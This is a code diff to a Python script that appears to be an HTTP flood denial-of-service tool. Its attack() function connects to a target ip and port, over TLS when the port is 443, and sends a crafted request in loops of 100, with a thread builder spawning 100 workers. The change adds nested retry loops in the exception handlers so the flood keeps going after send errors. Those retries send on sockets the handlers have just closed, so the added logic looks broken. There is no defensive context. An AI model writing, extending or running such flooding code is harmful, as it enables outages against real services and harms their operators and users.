@@ -101,6 +101,7 @@ def attack():
         request = get_host + header
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
+
         if port == 443:
             ctx = ssl.SSLContext()
             x = ctx.wrap_socket(s,server_hostname=ip)
@@ -109,13 +110,22 @@ def attack():
                     x.send(str.encode(request))
             except:
                 x.close()
-                pass
+                try:
+                    for i in range(100):
+                        x.send(str.encode(request))
+                except:
+                    x.close()
+
         try:
             for e in range(100):
                 s.send(str.encode(request))
         except:
             s.close()
-            pass
+            try:
+                for e in range(100):
+                    s.send(str.encode(request))
+            except:
+                s.close()
 
 def build_thread():
 	for _ in range(100):
